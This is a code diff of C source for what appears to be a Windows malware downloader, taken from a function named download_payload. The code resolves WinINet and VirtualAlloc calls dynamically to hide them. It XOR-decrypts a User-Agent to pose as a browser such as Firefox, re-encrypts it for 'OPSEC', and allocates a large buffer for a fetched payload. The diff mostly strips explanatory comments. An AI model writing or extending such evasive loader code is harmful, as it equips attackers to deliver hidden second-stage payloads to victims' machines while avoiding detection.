@@ -3,7 +3,7 @@
 #include "evasion.h"
 #include <stdio.h>
 
-// used to cast generic API function pointer (FARPROC)
+// --- typedefs definition
 typedef HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
 typedef HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
 typedef BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
@@ -61,13 +61,8 @@ char* download_payload(SIZE_T* payload_size) {
 
     // --- download file logic
     
-    // decrypt User-Agent
     xor_crypt(enc_user_agent, sizeof(enc_user_agent), cypher_key, cypher_key_len);
-    
-    // act as a legitimate browser (ex. Firefox)
     HINTERNET hInternet = fnInternetOpenA(enc_user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    
-    // OPSEC: recypher User-Agent immediately
     xor_crypt(enc_user_agent, sizeof(enc_user_agent), cypher_key, cypher_key_len);
 
     if (!hInternet) return NULL;
@@ -86,7 +81,6 @@ char* download_payload(SIZE_T* payload_size) {
     // MODIFY: increment buffer size if payload is bigger
     SIZE_T buffer_size = 35 * 1024 * 1024;
     
-    // use dynamically resolved VirtualAlloc
     char* payload_buffer = (char*) fnVirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     if (!payload_buffer) {
